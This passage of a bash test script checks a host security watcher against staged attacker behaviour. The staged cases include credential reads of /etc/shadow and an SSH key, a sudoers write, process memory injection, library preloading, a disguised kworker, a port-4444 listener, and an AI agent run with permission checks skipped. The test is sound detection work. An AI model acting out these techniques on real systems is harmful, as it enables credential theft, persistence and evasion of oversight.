REACHED=$!
REACHED_EXE="$(readlink "/proc/${REACHED}/exe")"
STEP=270
{
    printf 'type=SYSCALL msg=audit(%s.100:1101): arch=c000003e syscall=101 success=yes exit=0 a0=10 a1=%x a2=0 a3=0 items=0 ppid=1 pid=61 auid=4500 uid=4500 gid=4500 euid=4500 suid=4500 fsuid=4500 egid=4500 sgid=4500 fsgid=4500 tty=(none) ses=3 comm="watch-attach" exe="/var/tmp/watch-attach" subj=unconfined_u:unconfined_r:unconfined_t:s0 key="injection"\n' \
        "$((BEGAN + STEP))" "${REACHED}"
    close 1199
} >>"${AMETHYSTORA_WATCH_AUDIT}"
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the run with an attach from the audit rules failed"
kill "${REACHED}" 2>/dev/null || true
FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "injection")')"
jq -se --arg text "/var/tmp/watch-attach attached to ${REACHED_EXE} (process ${REACHED}), as 4500" \
    --arg allow "/var/tmp/watch-attach ${REACHED_EXE}" 'length == 1 and .[0].level == "normal"
    and .[0].tactic == "Defense Evasion" and .[0].text == $text and .[0].allow == $allow' <<<"${FOUND}" >/dev/null ||
    fail "an attach from the audit rules: ${FOUND}"
echo "INJECTION=off" >>"${AMETHYSTORA_SECURITY_CONF}"

# An autostart entry turned off as Control's Starting with you does it (amethystora-startup): a file holding exactly
# "[Desktop Entry]" and "Hidden=true" is recorded only; one with a command in it, or a link to such a file, is said
echo "PERSISTENCE=on" >>"${AMETHYSTORA_SECURITY_CONF}"
mkdir -p "${R}/var/home/alice/.config/autostart"
printf '[Desktop Entry]\nHidden=true\n' >"${R}/var/home/alice/.config/autostart/watch-hidden.desktop"
printf '[Desktop Entry]\nHidden=true\nExec=/var/tmp/watch-run\n' >"${R}/var/home/alice/.config/autostart/watch-hidden-exec.desktop"
printf '[Desktop Entry]\nHidden=true\n' >"${T}/watch-hidden-elsewhere.desktop"
ln -s "${T}/watch-hidden-elsewhere.desktop" "${R}/var/home/alice/.config/autostart/watch-hidden-link.desktop"
STEP=300
{
    opened 1201 71 /usr/bin/python3.14 /var/home/alice/.config/autostart/watch-hidden.desktop persistence
    opened 1202 72 /usr/bin/python3.14 /var/home/alice/.config/autostart/watch-hidden-exec.desktop persistence
    opened 1203 73 /usr/bin/python3.14 /var/home/alice/.config/autostart/watch-hidden-link.desktop persistence
    close 1299
} >>"${AMETHYSTORA_WATCH_AUDIT}"
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the run with autostart entries turned off failed"
# (turned on again, the part reads from the last run, which says the earlier steps' entries once more)
FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "persistence" and (.text | test("autostart/watch-hidden")))')"
jq -se 'length == 3
    and any(.[]; .level == "quiet" and (.text | test("autostart/watch-hidden[.]desktop using")))
    and any(.[]; .level == "normal" and (.text | test("autostart/watch-hidden-exec[.]desktop using")))
    and any(.[]; .level == "normal" and (.text | test("autostart/watch-hidden-link[.]desktop using")))' \
    <<<"${FOUND}" >/dev/null || fail "autostart entries turned off: ${FOUND}"
rm -f "${R}/var/home/alice/.config/autostart"/watch-hidden*.desktop "${T}/watch-hidden-elsewhere.desktop"

# A program whose own path spells the end of systemd's ("x.wants/ using /usr/lib/systemd/systemd") is not systemd:
# the sentence has two " using ", cannot say where the file ends and the program begins, and is not quietened by it
STEP=330
FORGED="$(printf '%s' "/var/home/alice/x.wants/ using /usr/lib/systemd/systemd" | od -An -tx1 | tr -d ' \n' | tr a-f A-F)"
{
    opened 1301 81 "${FORGED}" /var/home/alice/.config/autostart/watch-forged.desktop persistence |
        sed 's/exe="\([0-9A-F]*\)"/exe=\1/'
    close 1399
} >>"${AMETHYSTORA_WATCH_AUDIT}"
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the run with a program named like systemd failed"
FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "persistence" and (.text | test("watch-forged")))')"
jq -se 'length == 1 and .[0].level == "normal" and (.[0] | has("allow") | not)' <<<"${FOUND}" >/dev/null ||
    fail "a program whose path spells systemd's was taken for it: ${FOUND}"
echo "PERSISTENCE=off" >>"${AMETHYSTORA_SECURITY_CONF}"

# Programs that accept connections, from a stand-in ss: the image's own passim is recorded, and one nobody
# knows is said, with what allows it
mkdir -p "${T}/ss-bin"
cat >"${T}/ss-bin/ss" <<'EOF'
#!/usr/bin/bash
echo 'LISTEN 0 4096 0.0.0.0:27500 0.0.0.0:* users:(("passimd",pid=900,fd=8))'
echo 'LISTEN 0 4096 0.0.0.0:4444 0.0.0.0:* users:(("watch-nc",pid=901,fd=3))'
echo 'LISTEN 0 4096 0.0.0.0:4445 0.0.0.0:* users:(("wa*tch",pid=902,fd=3))'
EOF
chmod 0755 "${T}/ss-bin/ss"
echo "LISTENERS=on" >>"${AMETHYSTORA_SECURITY_CONF}"
before="$(wc -l <"${HISTORY}")"
PATH="${T}/ss-bin:${PATH}" timeout 120 "${WATCH}" >/dev/null || fail "the run with listeners failed"
FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "listeners")')"
jq -se 'length == 3
    and any(.[]; .allow == "wa\\*tch 4445")
    and any(.[]; .level == "quiet" and .allow == "passimd 27500" and .allowed == "yes")
    and any(.[]; .level == "normal" and .allow == "watch-nc 4444" and (.text | startswith("watch-nc accepts connections on port 4444")))' \
    <<<"${FOUND}" >/dev/null || fail "programs that accept connections: ${FOUND}"
echo "LISTENERS=off" >>"${AMETHYSTORA_SECURITY_CONF}"

# --- The behaviour sensor, from a stand-in of Falco's file ------------------------------------------------

# Falco's lines as 0.45 writes them (one seen on a real run): a warning said with its tactic, twice is once,
# a notice recorded, and a half-written last line left for the next run
echo "BEHAVIOUR=on" >>"${AMETHYSTORA_SECURITY_CONF}"
mkdir -p "${R}/var/log/falco"
FALCO_LINE='{"hostname":"h","output":"x","output_fields":{"evt.time":1,"fd.name":"/etc/shadow","proc.cmdline":"cat /etc/shadow","proc.exepath":"/usr/bin/cat","proc.name":"cat","user.name":"alice","user.uid":1000},"priority":"Warning","rule":"Read sensitive file untrusted","source":"syscall","tags":["T1555","filesystem","host","maturity_stable","mitre_credential_access"],"time":"2026-10-10T14:01:57.748052002Z"}'
{
    echo "${FALCO_LINE}"
    echo "${FALCO_LINE}"
    echo '{"output_fields":{"proc.exepath":"/usr/bin/bash","user.name":"bob","proc.cmdline":"bash"},"priority":"Notice","rule":"Terminal shell in container","tags":["mitre_execution"]}'
    printf '{"rule":"half'
} >"${R}/var/log/falco/events.json"
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the run reading the behaviour sensor failed"
FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "behaviour")')"
jq -se 'length == 2
    and any(.[]; .level == "normal" and .tactic == "Credential Access" and .account == "alice"
        and .text == "The behaviour sensor saw: Read sensitive file untrusted, by /usr/bin/cat as alice: cat /etc/shadow (2 times)"
        and .allow == "/usr/bin/cat Read sensitive file untrusted")
    and any(.[]; .level == "quiet" and .tactic == "Execution")' <<<"${FOUND}" >/dev/null || fail "the behaviour sensor: ${FOUND}"
sed -i '/^BEHAVIOUR=on$/d' "${AMETHYSTORA_SECURITY_CONF}"

# --- Hash reputation, from a stand-in for curl -----------------------------------------------------------

# A known hash is critical, an unknown one nothing, each asked once, and the key never on a command line
KNOWN="$(printf 'a%.0s' $(seq 1 64))" UNKNOWN="$(printf 'b%.0s' $(seq 1 64))"
echo "REPUTATION=on" >>"${AMETHYSTORA_SECURITY_CONF}"
mkdir -p "${R}/etc/amethystora"
echo "secret-key-123" >"${R}/etc/amethystora/abusech.key"
cat >"${T}/curl" <<EOF
#!/usr/bin/bash
printf '%s\n' "\$*" >>"${T}/curl-args"
[[ "\$*" == *"hash=${KNOWN}"* ]] && echo '{"query_status":"ok","data":[{"signature":"Mirai","first_seen":"2026-01-02 03:04:05"}]}' && exit 0
echo '{"query_status":"hash_not_found"}'
EOF
chmod 0755 "${T}/curl"
export AMETHYSTORA_WATCH_CURL="${T}/curl"
printf '%s\t%s\n' "${KNOWN}" /var/tmp/bad "${UNKNOWN}" /var/tmp/fine >"${R}/var/lib/amethystora/security/reputation-queue"
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the run looking up hashes failed"
FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "reputation")')"
jq -se 'length == 1 and .[0].level == "critical" and (.[0].text | test("/var/tmp/bad, which MalwareBazaar knows as Mirai"))' \
    <<<"${FOUND}" >/dev/null || fail "hash reputation: ${FOUND}"
grep -q "secret-key-123" "${T}/curl-args" && fail "the key was on curl's command line"
[[ "$(wc -l <"${T}/curl-args")" -eq 2 ]] || fail "each hash was not asked once"
printf '%s\t%s\n' "${KNOWN}" /var/tmp/bad >"${R}/var/lib/amethystora/security/reputation-queue"
timeout 120 "${WATCH}" >/dev/null || fail "the second run looking up hashes failed"
[[ "$(wc -l <"${T}/curl-args")" -eq 2 ]] || fail "a hash was asked twice"
sed -i '/^REPUTATION=on$/d' "${AMETHYSTORA_SECURITY_CONF}"

# --- Network protection's alerts --------------------------------------------------------------------------

# A hunting rule's alert is recorded and never said, whatever its severity; another severe one is said
mkdir -p "${R}/var/log/suricata"
printf '%s\n' \
    '{"timestamp":"2026-10-10T10:00:00.000000+0000","event_type":"alert","src_ip":"10.0.0.2","dest_ip":"203.0.113.9","dest_port":443,"proto":"TCP","alert":{"action":"allowed","signature_id":2030000,"signature":"ET HUNTING Suspicious TLS SNI","category":"x","severity":1}}' \
    '{"timestamp":"2026-10-10T10:00:01.000000+0000","event_type":"alert","src_ip":"10.0.0.2","dest_ip":"203.0.113.10","dest_port":443,"proto":"TCP","alert":{"action":"allowed","signature_id":9000001,"signature":"Feodo Tracker: known command server","category":"x","severity":1}}' \
    >"${R}/var/log/suricata/eve.json"
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the run reading network protection's alerts failed"
FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "network")')"
jq -se 'length == 2 and any(.[]; (.text | test("ET HUNTING")) and .level == "quiet")
    and any(.[]; (.text | test("Feodo Tracker")) and .level == "normal")' <<<"${FOUND}" >/dev/null ||
    fail "network protection's alerts: ${FOUND}"
rm -f "${R}/var/log/suricata/eve.json"

# Odd names in DNS: what the monitor flags, and only that; the watcher says each once, what is allowed quietly
FLAGGED="$(printf '%s\n' www.google.com fonts.gstatic.com github.com xjq3k9vbz2mwp8rtqk.com \
    "$(printf 'a%.0s' $(seq 1 60)).tunnel.example" d3k8f9qxz7mvb2.cloudfront.net 'evil<b>.example' |
    /usr/libexec/amethystora-dns-names --check)"
[[ "$(cut -d$'\x1f' -f2 <<<"${FLAGGED}")" == "$(printf '%s\n' xjq3k9vbz2mwp8rtqk.com "$(printf 'a%.0s' $(seq 1 60)).tunnel.example")" ]] ||
    fail "the names flagged: ${FLAGGED}"
echo "DNS_NAMES=on" >>"${AMETHYSTORA_SECURITY_CONF}"
echo '*.tunnel.example' >"${R}/etc/amethystora/allow.d/dns-names"
printf '%s\n' "${FLAGGED}" >"${R}/var/lib/amethystora/security/dns-names"
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the run reading DNS names failed"
FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "dns-names")')"
jq -se 'length == 2 and any(.[]; (.text | test("xjq3k9vbz2mwp8rtqk.com, a domain that looks made by a program")) and .level == "normal")
    and any(.[]; (.text | test("tunnel.example, a label of 60 characters")) and .level == "quiet")' <<<"${FOUND}" >/dev/null ||
    fail "odd names in DNS: ${FOUND}"
[[ ! -s "${R}/var/lib/amethystora/security/dns-names" ]] || fail "what was read was not emptied"

# --- What the file-watch sensor records, as its own record writer writes it ------------------------------

# A stand-in plan gives every key to the sensor, so the watcher reads them from the sensor's log, by
# checkpoints of their own: a program run, one kept from running, a secret read, a write to the sudoers
# folder, and a signal sent to the sensor, each written by amethystora-sensor --records (no BPF). A stand-in
# systemctl has the unit running, then restarted once since the last look; and the drops it counted reach
# the status.
export AMETHYSTORA_WATCH_SENSOR="${T}/sensor.log" AMETHYSTORA_SENSOR_RUN="${T}/sensor-run"
export AMETHYSTORA_WATCH_SYSTEMCTL="${T}/systemctl"
mkdir -p "${AMETHYSTORA_SENSOR_RUN}"
printf '%s sensor\n' identity privilege persistence hardening modules input-capture user-programs exec-watch \
    agent-clis credentials decoy >"${AMETHYSTORA_SENSOR_RUN}/plan"
echo 7 >"${AMETHYSTORA_SENSOR_RUN}/dropped"
echo 0 >"${T}/restarts"
cat >"${T}/systemctl" <<EOF
#!/usr/bin/bash
[[ "\$*" == *NRestarts* ]] && cat "${T}/restarts"
exit 0
EOF
chmod 0755 "${T}/systemctl"
echo "PRIVILEGE=on" >>"${AMETHYSTORA_SECURITY_CONF}"
: >"${AMETHYSTORA_WATCH_SENSOR}"
chmod 0600 "${AMETHYSTORA_WATCH_SENSOR}"
timeout 120 "${WATCH}" >/dev/null || fail "the first run reading the sensor failed"
cp /usr/bin/true /var/tmp/watch-sensor-run
printf 'sensor' >>/var/tmp/watch-sensor-run
head -c 64 /dev/urandom >/var/tmp/watch-sensor-refused
/usr/libexec/amethystora-sensor --records >>"${AMETHYSTORA_WATCH_SENSOR}" <<'EVENTS'
{"op":17,"syscall":59,"keys":["exec-watch"],"auid":4500,"uid":4500,"path2":"/var/tmp/watch-sensor-run","exe":"/var/tmp/watch-sensor-run","argv":["/var/tmp/watch-sensor-run"],"argc":1,"cwd":"/var/tmp","mode":"0100755"}
{"op":17,"syscall":59,"result":-13,"keys":["exec-watch"],"flags":1073741824,"auid":4500,"uid":4500,"path2":"/var/tmp/watch-sensor-refused","exe":"/usr/bin/bash","cwd":"/var/tmp"}
{"op":1,"syscall":257,"result":3,"keys":["credentials"],"flags":134217728,"auid":4500,"uid":4500,"dir":"/var/home/alice/.ssh","name":"id_ed25519","cwd":"/var/home/alice","mode":"0100600","exe":"/usr/bin/base64"}
{"op":1,"syscall":257,"result":3,"keys":["privilege"],"flags":2147483648,"auid":4500,"dir":"/etc/sudoers.d","name":"watch-sensor","parent_mode":"040750","mode":"0100644","exe":"/usr/bin/tee"}
{"op":18,"syscall":62,"keys":["sensor"],"auid":4500,"args":["4d2","13","0","0"],"exe":"/usr/bin/kill"}
EVENTS
echo 1 >"${T}/restarts"
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the run reading the sensor failed"
FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key != "chains")')"
jq -se 'any(.[]; .key == "exec-watch" and .text == "A program ran for the first time from where downloads and temporary files land: /var/tmp/watch-sensor-run, as 4500")
    and any(.[]; .key == "exec-watch" and .allow == "/var/tmp/watch-sensor-refused"
        and .text == "A program was kept from running where downloads and temporary files land: /var/tmp/watch-sensor-refused, as 4500")
    and any(.[]; .key == "credentials" and (.text | startswith("/usr/bin/base64 read /var/home/alice/.ssh/id_ed25519")))
    and any(.[]; .key == "privilege" and .level == "critical" and (.text | test("/etc/sudoers.d/watch-sensor using /usr/bin/tee")))
    and any(.[]; .key == "hardening" and .level == "critical" and (.text | test("reached for the file-watch sensor itself: .*killed-pid using /usr/bin/kill")))
    and any(.[]; .key == "hardening" and .level == "critical" and (.text | test("stopped and was started again since the last check:")))' \
    <<<"${FOUND}" >/dev/null || fail "what the sensor recorded: ${FOUND}"
jq -e '.sensor.drops == 7 and .sensor.active == true and any(.sensor.covered[]; . == "privilege")' \
    "${R}/var/lib/amethystora/security/status.json" >/dev/null || fail "the sensor's status: $(jq -c .sensor "${R}/var/lib/amethystora/security/status.json")"
# Nothing new, and no restart since: nothing said
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the second run reading the sensor failed"
tail -n +"$((before + 1))" "${HISTORY}" | grep -qE 'exec-watch|file-watch sensor' && fail "the sensor's findings were said twice"

# Folders the sensor could not register (an account used up its share, the table is full), and a home the generator
# stopped short: what is written there is not recorded, and each is said once
printf 'uid 4500\ntable\n' >"${AMETHYSTORA_SENSOR_RUN}/full"
printf '4500\n' >"${AMETHYSTORA_SENSOR_RUN}/skipped"
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the run with a full folder table failed"
FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "hardening")')"
jq -se 'length == 3
    and any(.[]; .level == "normal" and (.text | test("Account 4500 made so many folders")))
    and any(.[]; .level == "normal" and (.text | test("table of folders is full")))
    and any(.[]; .level == "critical" and (.text | test("Account 4500 holds so many files")))' <<<"${FOUND}" >/dev/null || fail "what the sensor could not watch: ${FOUND}"
jq -e '.sensor.full == true' "${R}/var/lib/amethystora/security/status.json" >/dev/null || fail "the status does not say the table is full"
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the second run with a full folder table failed"
tail -n +"$((before + 1))" "${HISTORY}" | grep -qE 'so many (folders|files)|table of folders' && fail "a full table was said twice"
rm -f "${AMETHYSTORA_SENSOR_RUN}/full" "${AMETHYSTORA_SENSOR_RUN}/skipped"

# Reaching into another program's memory, as the sensor records it, with the program reached and both mount
# namespaces: a write into another program, a read of its memory, an open of /proc/PID/mem to read, and a try
# the kernel refused are said; a program's own business (a neighbour in its own folder, two programs in one
# sandbox), a debugger, and what the owner allowed are recorded
echo "injection sensor" >>"${AMETHYSTORA_SENSOR_RUN}/plan"
echo "INJECTION=on" >>"${AMETHYSTORA_SECURITY_CONF}"
echo "/var/tmp/watch-allowed /usr/bin/*" >"${R}/etc/amethystora/allow.d/injection"
timeout 120 "${WATCH}" >/dev/null || fail "the first run reading the sensor's injection failed"
HOST="$(stat -L -c %i /proc/1/ns/mnt)"
/usr/libexec/amethystora-sensor --records >>"${AMETHYSTORA_WATCH_SENSOR}" <<EVENTS
{"op":20,"syscall":311,"keys":["injection"],"auid":4500,"args":["1092"],"exe":"/var/tmp/watch-inject","path2":"/usr/bin/gnome-keyring-daemon","target":4242,"target_comm":"gnome-keyring-d","target_mnt":${HOST},"own_mnt":${HOST}}
{"op":20,"syscall":310,"keys":["injection"],"auid":4500,"args":["1093"],"exe":"/var/tmp/watch-dump","path2":"/usr/bin/firefox","target":4243,"target_mnt":${HOST},"own_mnt":${HOST}}
{"op":20,"syscall":101,"result":-1,"keys":["injection"],"auid":4500,"args":["10","1094"],"exe":"/var/tmp/watch-attach","path2":"/usr/bin/sleep","target":4244,"target_mnt":${HOST},"own_mnt":${HOST}}
{"op":20,"syscall":257,"keys":["injection"],"auid":4500,"args":["ffffff9c","0","0"],"exe":"/var/tmp/watch-peek","path2":"/usr/bin/cat","target":4245,"target_mnt":${HOST},"own_mnt":${HOST}}
{"op":20,"syscall":101,"keys":["injection"],"auid":4500,"args":["4206"],"exe":"/opt/watch-app/crashpad_handler","path2":"/opt/watch-app/app","target":4246,"target_mnt":${HOST},"own_mnt":${HOST}}
{"op":20,"syscall":311,"keys":["injection"],"auid":4500,"exe":"/usr/bin/wineserver","path2":"/app/bin/game.exe","target":4247,"target_mnt":4026599999,"own_mnt":4026599999}
{"op":20,"syscall":101,"keys":["injection"],"auid":4500,"args":["10"],"exe":"/usr/libexec/gdb","path2":"/usr/bin/sleep","target":4248,"target_mnt":${HOST},"own_mnt":${HOST}}
{"op":20,"syscall":257,"keys":["injection"],"auid":4500,"args":["ffffff9c","0","2"],"exe":"/var/tmp/watch-allowed","path2":"/usr/bin/sleep","target":4249,"target_mnt":${HOST},"own_mnt":${HOST}}
EVENTS
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the run reading the sensor's injection failed"
FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "injection")')"
jq -se 'length == 8
    and any(.[]; .level == "normal" and .tactic == "Defense Evasion" and .allow == "/var/tmp/watch-inject /usr/bin/gnome-keyring-daemon"
        and .text == "/var/tmp/watch-inject wrote into the memory of /usr/bin/gnome-keyring-daemon (process 4242), as 4500")
    and any(.[]; .level == "normal" and .tactic == "Credential Access" and .text == "/var/tmp/watch-dump read the memory of /usr/bin/firefox (process 4243), as 4500")
    and any(.[]; .level == "normal" and .tactic == "Defense Evasion"
        and .text == "/var/tmp/watch-attach tried to reach into /usr/bin/sleep (process 4244) and the kernel refused it, as 4500")
    and any(.[]; .level == "normal" and .tactic == "Credential Access" and (.text | startswith("/var/tmp/watch-peek read the memory of /usr/bin/cat")))
    and any(.[]; .level == "quiet" and (.text | startswith("/opt/watch-app/crashpad_handler attached to /opt/watch-app/app")))
    and any(.[]; .level == "quiet" and (.text | startswith("/usr/bin/wineserver wrote into the memory of /app/bin/game.exe")))
    and any(.[]; .level == "quiet" and (.text | startswith("/usr/libexec/gdb attached to")))
    and any(.[]; .level == "quiet" and .allowed == "yes" and (.text | startswith("/var/tmp/watch-allowed opened for writing the memory of")))' \
    <<<"${FOUND}" >/dev/null || fail "what reached into other programs' memory: ${FOUND}"
echo "INJECTION=off" >>"${AMETHYSTORA_SECURITY_CONF}"
rm -f /var/tmp/watch-sensor-run /var/tmp/watch-sensor-refused
unset AMETHYSTORA_WATCH_SENSOR AMETHYSTORA_SENSOR_RUN AMETHYSTORA_WATCH_SYSTEMCTL
echo "PRIVILEGE=off" >>"${AMETHYSTORA_SECURITY_CONF}"

# --- What runs ------------------------------------------------------------------------------------------------

unset AMETHYSTORA_WATCH_AUDIT
sed -i 's/^SELINUX_DENIALS=on$/AUDIT_LOG=off\nPROCESSES=on/' "${AMETHYSTORA_SECURITY_CONF}"
# alice is logged in, and a stand-in systemctl gives her user manager's environment, asked as alice
export AMETHYSTORA_WATCH_SYSTEMCTL="${T}/systemctl" AMETHYSTORA_WATCH_ACCOUNTS=4500
printf '#!/usr/bin/bash\n[[ "$*" == "--user show-environment" && "$(id -u)" == 4500 && "${XDG_RUNTIME_DIR}" == /run/user/4500 ]] && cat "%s/session-env"\nexit 0\n' "${T}" \
    >"${T}/systemctl"
chmod 0755 "${T}/systemctl"
echo "HOME=/var/home/alice" >"${T}/session-env"
# The first run with it on only records what runs already
timeout 120 "${WATCH}" >/dev/null || fail "the first run reading processes failed"
P="$(mktemp -d /var/tmp/watch-XXXX)"
cp /usr/bin/sleep "${P}/dropped"
cp /usr/bin/sleep "${P}/gone"
mkdir -p "${P}/allowed"
# A program is remembered by what it is: a byte more makes it another one
cp /usr/bin/sleep "${P}/allowed/sleep"
printf x >>"${P}/allowed/sleep"
printf '#!/usr/bin/bash\nsleep 300\n' >/var/tmp/claude
chmod 0755 /var/tmp/claude
PIDS=()
"${P}/dropped" 300 &
PIDS+=($!)
"${P}/gone" 301 &
PIDS+=($!)
rm "${P}/gone"
"${P}/allowed/sleep" 302 &
PIDS+=($!)
# A disguised thread, a network tool an npm script started, and an agent run with its checks off
bash -c 'exec -a "[kworker/0:9]" /usr/bin/cat' < <(sleep 300) >/dev/null &
PIDS+=($!)
npm_lifecycle_event=postinstall bash -c 'exec -a curl /usr/bin/sleep 303' &
PIDS+=($!)
/var/tmp/claude --dangerously-skip-permissions </dev/null >/dev/null 2>&1 &
PIDS+=($!)
# Libraries loaded from outside /usr, by their path and by a bare name LD_LIBRARY_PATH finds outside it; one
# under /usr, as gamemoderun's and MangoHud's are, or under /usr/$LIB, is not said, nor one that climbs out
# of /usr is let through
LD_PRELOAD="${P}/inject.so" /usr/bin/sleep 305 2>/dev/null &
PIDS+=($!)
LD_PRELOAD=libfake.so LD_LIBRARY_PATH="/usr/lib64:${P}/lib" /usr/bin/sleep 306 2>/dev/null &
PIDS+=($!)
# shellcheck disable=SC2016 # ld.so expands $LIB itself
LD_PRELOAD='libgamemodeauto.so.0 /usr/$LIB/libMangoHud_shim.so' /usr/bin/sleep 307 2>/dev/null &
PIDS+=($!)
LD_AUDIT="/usr/lib64/../..${P}/audit.so" /usr/bin/sleep 308 2>/dev/null &
PIDS+=($!)
# ...and a session whose own environment has every program it starts load code: a library from a home, a
# Java agent, and one the owner allowed; GStreamer's own plugins, under /usr, are not said
printf '%s\n' "HOME=/var/home/alice" "LD_PRELOAD=/var/home/alice/.cache/x.so" "GST_PLUGIN_SYSTEM_PATH=/usr/lib64/gstreamer-1.0" \
    "JAVA_TOOL_OPTIONS=-javaagent:/var/home/alice/agent.jar" "LD_AUDIT=/var/home/alice/allowed.so" >"${T}/session-env"
mkdir -p "${R}/etc/amethystora/allow.d"
printf '%s\n' "${P}/allowed/*" "LD_AUDIT ~/allowed.so" >"${R}/etc/amethystora/allow.d/processes"
sleep 1
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the run reading processes failed"
FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "processes")')"
kill "${PIDS[@]}" 2>/dev/null || true
for want in "runs from a folder where downloads and temporary files land: ${P}/dropped" \
    "runs from a file that was deleted since: ${P}/gone" 'names itself like a kernel thread, [kworker/0:9]' \
    "An npm package's postinstall script started curl" \
    'An AI agent runs with its own checks turned off: claude --dangerously-skip-permissions (/var/tmp/claude), started without a terminal' \
    "A library from outside the system is loaded into /usr/bin/sleep: ${P}/inject.so" \
    "A library from outside the system is loaded into /usr/bin/sleep: ${P}/lib/libfake.so" \
    "A library from outside the system is loaded into /usr/bin/sleep: /usr/lib64/../..${P}/audit.so" \
    "Every program started in alice's session now loads /var/home/alice/.cache/x.so (LD_PRELOAD)" \
    "Every program started in alice's session now loads /var/home/alice/agent.jar (JAVA_TOOL_OPTIONS)"; do
    grep -qF -- "${want}" <<<"${FOUND}" || fail "what runs: \"${want}\" was not found in ${FOUND}"
done
grep -qE 'gamemode|MangoHud|gstreamer' <<<"${FOUND}" && fail "a library under /usr was said: ${FOUND}"
jq -se 'any(.[]; (.text | test("kernel thread")) and .level == "critical" and .tactic == "Defense Evasion")
    and any(.[]; (.text | test("/allowed/sleep")) and .level == "quiet")
    and any(.[]; (.text | test("AI agent")) and .allow == "/var/tmp/claude")
    and any(.[]; (.text | test("inject.so")) and .level == "normal" and .tactic == "Defense Evasion" and .allow == "'"${P}"'/inject.so")
    and any(.[]; (.text | test("x.so .LD_PRELOAD.")) and .level == "normal" and .tactic == "Persistence" and .account == "alice"
        and .allow == "LD_PRELOAD /var/home/alice/.cache/x.so")
    and any(.[]; (.text | test("allowed.so .LD_AUDIT.")) and .level == "quiet")
    and all(.[] | select(.text | test("session") | not); .account == "root")' <<<"${FOUND}" >/dev/null ||
    fail "what runs, its levels: ${FOUND}"
# Each is said once
before="$(wc -l <"${HISTORY}")"
cp /usr/bin/sleep "${P}/dropped"
"${P}/dropped" 304 &
PIDS=($!)
timeout 120 "${WATCH}" >/dev/null || fail "the second run reading processes failed"
kill "${PIDS[@]}" 2>/dev/null || true
tail -n +"$((before + 1))" "${HISTORY}" | grep -q '"key":"processes"' && fail "the same program was said twice"
rm -rf "${P}" /var/tmp/claude
unset AMETHYSTORA_WATCH_SYSTEMCTL AMETHYSTORA_WATCH_ACCOUNTS

# --- Programs in the kernel's BPF, from a stand-in bpftool ------------------------------------------------

sed -i 's/^PROCESSES=on$/BPF_PROGRAMS=on/' "${AMETHYSTORA_SECURITY_CONF}"
export AMETHYSTORA_WATCH_BPFTOOL="${T}/bpftool"
printf '#!/usr/bin/bash\ncat "%s/bpf.json"\n' "${T}" >"${T}/bpftool"
chmod 0755 "${T}/bpftool"
echo '[{"id":1,"type":"cgroup_device","tag":"aa11","pids":[{"pid":1,"comm":"systemd"}]}]' >"${T}/bpf.json"
timeout 120 "${WATCH}" >/dev/null || fail "the first run reading BPF failed"
sleep 600 &
HOLDER=$!
cp /usr/bin/sleep /var/tmp/loader
/var/tmp/loader 600 &
LOADER=$!
jq -nc --argjson holder "${HOLDER}" --argjson loader "${LOADER}" '[
    {id: 1, type: "cgroup_device", tag: "aa11", pids: [{pid: 1, comm: "systemd"}]},
    {id: 2, type: "cgroup_skb", tag: "bb22", name: "sd_fw_egress", pids: [{pid: $holder, comm: "sleep"}]},
    {id: 3, type: "kprobe", tag: "cc33", name: "hide\u001b[2J"},
    {id: 4, type: "tracepoint", tag: "dd44", name: "spy", pids: [{pid: $loader, comm: "loader"}]}]' >"${T}/bpf.json"
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the run reading BPF failed"
kill "${HOLDER}" "${LOADER}" 2>/dev/null || true
rm -f /var/tmp/loader
FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "bpf-programs")')"
jq -se 'length == 3
    and any(.[]; (.text | test("sd_fw_egress .cgroup_skb, tag bb22., by /usr/bin/sleep")) and .level == "quiet")
    and any(.[]; (.text | test("hide..2J .kprobe, tag cc33., by a process that is gone")) and .level == "normal")
    and any(.[]; (.text | test("spy .tracepoint, tag dd44., by /var/tmp/loader")) and .level == "normal"
        and .allow == "spy /var/tmp/loader")' <<<"${FOUND}" >/dev/null || fail "BPF programs: ${FOUND}"

# --- Ransomware behaviour, from stand-in snapshots and a stand-in btrfs -------------------------------------

# btrfs's dump as btrfs-progs 7.1 writes it (seen on a real pair of snapshots): alice's documents rewritten
# with random bytes, bob's few changed, mallory's deleted, and a cache's changes, which do not count
sed -i 's/^BPF_PROGRAMS=on$/SNAPSHOT_WATCH=on/' "${AMETHYSTORA_SECURITY_CONF}"
export AMETHYSTORA_WATCH_BTRFS="${T}/btrfs"
